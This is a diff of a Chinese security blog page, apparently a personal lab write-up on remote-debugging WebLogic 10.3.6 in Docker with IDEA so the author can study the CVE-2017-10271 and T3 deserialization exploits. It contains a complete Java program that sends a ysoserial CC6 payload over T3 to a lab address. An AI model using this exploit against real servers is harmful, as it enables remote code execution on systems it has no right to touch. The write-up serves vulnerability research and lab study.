@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>标签 | Godown_blog</title>
+  <title>IDEA +docker远程调试weblogic | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -578,362 +578,587 @@
 </header>
         <!-- 内容区域 -->
         
-<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"></div>
-<div class="bg-light-floor-tags" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -3;"></div>
+ <!-- prismjs 代码高亮 -->
+ 
 
-<div class="tags-header" style="background-image:url('https://pic2.zhimg.com/80/v2-bf6c555e7c61a57ba4a1fd95a9a32975_1440w.jpg')">
-    <div class="tags-header-title">
-        tags
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8118.png')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        IDEA +docker远程调试weblogic
+      </span>
     </div>
-    <div class="tags-header-desc">
     
-        <span class="title" id="tags-header-desc"></span>
-        <script>
-  function typedFn() {
-    const el = '#tags-header-desc';
-    const type = 'tag';
-    let desc = '愿你如风，被人温柔以待'
-    var typed = new Typed(el, {
-      strings: [desc],
-      startDelay: 100,
-      typeSpeed: 100,
-      loop: true,
-      backSpeed: 50,
-      showCursor: true
-    });
-  }
-  typedFn();
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <p>抄一个IDEA docker的远程调试，复现weblogic被整的大脑偏瘫</p>
+<h2 id="vulhub版环境搭建"><a href="#vulhub版环境搭建" class="headerlink" title="vulhub版环境搭建"></a>vulhub版环境搭建</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2017-10271">https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2017-10271</a></p>
+<p>首先将docker的8453开启</p>
+<p>修改docker-compose.yml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/weblogic</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后运行docker-compose up -d 下载和运行镜像。</p>
+<p>下载完成后</p>
+<p>使用<code>docker exec -it weblogic /bin/bash</code> 进入容器，修改<code>/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code></p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031174834776-898289365.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031174834776-898289365.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031174834776-898289365.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<p> 添加两行代码</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugFlag=<span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="built_in">export</span> debugFlag </span><br></pre></td></tr></table></figure>
+
+<p>然后<code>docker restart 容器id</code></p>
+<p>因为需要weblogic的源码，所以我们把 weblogic的源码和jdk包都拷贝出来。</p>
+<p><code>docker cp weblogic:/root ./weblogic_jars</code></p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175023249-413470801.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175023249-413470801.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175023249-413470801.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<p>然后idea打开<code>/root/Oracle/Middleware/wlserver_10.3/</code>目录</p>
+<p>如图</p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175129518-1227494194.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175129518-1227494194.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175129518-1227494194.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<p>然后使用命令把Middleware目录下所有的*.jar包都放在一个test的文件夹里。</p>
+<p>命令如下：</p>
+<p><code>find ./ -name *.jar -exec cp &#123;&#125; ./test/ \;</code></p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175246338-402360036.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175246338-402360036.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175246338-402360036.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<p>然后在libraries下添加test目录</p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175324633-1279780349.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175324633-1279780349.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175324633-1279780349.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<p>在jdk这块选用weblogic10.3.6自带的jdk6</p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175401969-1626244476.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175401969-1626244476.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175401969-1626244476.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<p> 都增加以后</p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175418941-438835508.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175418941-438835508.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175418941-438835508.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<p>这块就会出现两个目录。</p>
+<p>然后我们添加远程服务器。</p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175459102-1115823273.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175459102-1115823273.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175459102-1115823273.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<p> 端口号是8453</p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175516574-482328806.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175516574-482328806.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175516574-482328806.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<p> 然后应用，开启debug</p>
+<p>当console出现下面图片时候，说明可以了。</p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175606211-1788033283.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175606211-1788033283.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175606211-1788033283.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<p>然后在<code>/wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter.class</code>的129行下断点</p>
+<p><em><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175732510-274443972.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175732510-274443972.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175732510-274443972.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></em></p>
+<p>burp在wls-wsat进行发包</p>
+<p>当出现下图时，说明成功了。</p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175806877-931381151.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175806877-931381151.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175806877-931381151.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<h2 id="QAX-A-Team版环境搭建"><a href="#QAX-A-Team版环境搭建" class="headerlink" title="QAX-A-Team版环境搭建"></a>QAX-A-Team版环境搭建</h2><p>按照如下文档搭建好weblogic 并运行docker后</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p>
+<p>直接把weblogic安装包那个jar的modules提到IDEA库下面</p>
+<p>然后配置里远程调试</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125225835517.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125225835517.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241125225835517"></p>
+<p>自己写了个打weblogic 10.3.6的CC6</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.Weblogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebLogicExploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to generate payload using ysoserial</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] generatePayload() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;cc6.ser&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 读取二进制文件</span></span><br><span class="line">            payload = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to send the exploit payload over T3 protocol</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">T3Exploit</span><span class="params">(String ip, <span class="type">int</span> port, <span class="type">byte</span>[] payload)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(ip, port);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Send T3 handshake</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">handshake</span> <span class="operator">=</span> <span class="string">&quot;t3 10.3.6\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>;</span><br><span class="line">        outputStream.write(handshake.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Read response from the server</span></span><br><span class="line">        <span class="type">byte</span>[] response = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> inputStream.read(response);</span><br><span class="line">        <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(response, <span class="number">0</span>, len, StandardCharsets.UTF_8);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check if it&#x27;s WebLogic server</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;HELO&quot;</span>);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(responseData);</span><br><span class="line">        <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;WebLogic&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Not WebLogic&quot;</span>);</span><br><span class="line">            socket.close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Construct the full payload with headers and exploit data</span></span><br><span class="line">        <span class="type">byte</span>[] header = hexStringToByteArray(<span class="string">&quot;00000000&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] t3Header = hexStringToByteArray(<span class="string">&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] desFlag = hexStringToByteArray(<span class="string">&quot;fe010000&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        byteArrayOutputStream.write(header);</span><br><span class="line">        byteArrayOutputStream.write(t3Header);</span><br><span class="line">        byteArrayOutputStream.write(desFlag);</span><br><span class="line">        byteArrayOutputStream.write(payload);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] fullPayload = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set the length in the correct place</span></span><br><span class="line">        <span class="type">byte</span>[] lengthPrefix = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            lengthPrefix[i] = (<span class="type">byte</span>) ((fullPayload.length &gt;&gt; (<span class="number">8</span> * (<span class="number">3</span> - i))) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Send the payload</span></span><br><span class="line">        outputStream.write(lengthPrefix);</span><br><span class="line">        outputStream.write(fullPayload, <span class="number">4</span>, fullPayload.length - <span class="number">4</span>);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        </span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Helper function to convert hex string to byte array</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] hexStringToByteArray(String s) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[len / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">            data[i / <span class="number">2</span>] = (<span class="type">byte</span>) ((Character.digit(s.charAt(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">                                + Character.digit(s.charAt(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;192.168.152.128&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7001</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Generate the payload</span></span><br><span class="line">            <span class="type">byte</span>[] payload = generatePayload();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// Exploit WebLogic server</span></span><br><span class="line">            T3Exploit(ip, port, payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到可以调试</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125225921150.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125225921150.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241125225921150"></p>
+<p><code>docker images</code>查看docker id</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125215119331.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125215119331.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241125215119331"></p>
+<p>不对，我真是脑残啊我，<code>docker ps</code>查看正在运行的容器id</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125215725487.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125215725487.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241125215725487"></p>
+<p>进入容器：<code>docker exec -it 1985c4752c41 /bin/bash</code></p>
+<p>即可查看是否打成功</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125230040660.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125230040660.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241125230040660"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ph4nt0mer/p/11772709.html">https://www.cnblogs.com/ph4nt0mer/p/11772709.html</a></p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>GodownKai</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2024/11/25/idea-docker-yuan-cheng-diao-shi/" target="_blank" title="IDEA +docker远程调试weblogic">https://godownio.github.io/2024/11/25/idea-docker-yuan-cheng-diao-shi/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8117.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8117.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+    </div>
+    <a href="/2024/11/06/java-xxe/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fas fa-angle-right"></i>
+        <div class="title-text">论java中的XXE</div>
+      </div>
+      <!-- <div class="content">
+        简单介绍一下XXE
+XXE简述内部实体与外部实体一般是由一个DTD控制一个XML的格式。比如：
+DOCTYPE元素后跟的
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
 </script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
     
-    </div>
-    <div class="mask-box"></div>
-</div>
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
 
 
-<div id="tags" class="container">
-    <div class="card">
-        <div class="card-content">
-            <div class="tag-title center-align">
-                <i class="fas fa-tags"></i>&nbsp;&nbsp;文章标签
-            </div>
-            <div class="tag-chips">
-                
-                
-                <a href="/tags/C3P0/" title="C3P0: 1">
-                    <span class="tag-content"
-                        title="C3P0" style="background-color: #F8C471;">C3P0
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/CC/" title="CC: 11">
-                    <span class="tag-content"
-                        title="CC" style="background-color: #FFF;">CC
-                        <span class="tag-length">11</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/CTF/" title="CTF: 2">
-                    <span class="tag-content"
-                        title="CTF" style="background-color: #D7BDE2;">CTF
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/Groovy/" title="Groovy: 1">
-                    <span class="tag-content"
-                        title="Groovy" style="background-color: #D7BDE2;">Groovy
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/%E6%BA%AF%E6%BA%90/" title="溯源: 1">
-                    <span class="tag-content"
-                        title="溯源" style="background-color: #FEF9E7;">溯源
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/JSONP/" title="JSONP: 1">
-                    <span class="tag-content"
-                        title="JSONP" style="background-color: #F9E79F;">JSONP
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/%E8%9C%9C%E7%BD%90/" title="蜜罐: 1">
-                    <span class="tag-content"
-                        title="蜜罐" style="background-color: #D5F5E3;">蜜罐
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/hexo/" title="hexo: 1">
-                    <span class="tag-content"
-                        title="hexo" style="background-color: #FFF;">hexo
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/java%E5%8E%9F%E7%94%9FRCE/" title="java原生RCE: 3">
-                    <span class="tag-content"
-                        title="java原生RCE" style="background-color: #D5F5E3;">java原生RCE
-                        <span class="tag-length">3</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/CVE/" title="CVE: 2">
-                    <span class="tag-content"
-                        title="CVE" style="background-color: #E8F8F5;">CVE
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" title="SPEL表达式注入: 1">
-                    <span class="tag-content"
-                        title="SPEL表达式注入" style="background-color: #A3E4D7;">SPEL表达式注入
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/Tomcat/" title="Tomcat: 3">
-                    <span class="tag-content"
-                        title="Tomcat" style="background-color: #D5F5E3;">Tomcat
-                        <span class="tag-length">3</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" title="内存马: 3">
-                    <span class="tag-content"
-                        title="内存马" style="background-color: #82E0AA;">内存马
-                        <span class="tag-length">3</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/XStream/" title="XStream: 1">
-                    <span class="tag-content"
-                        title="XStream" style="background-color: #F9EBEA;">XStream
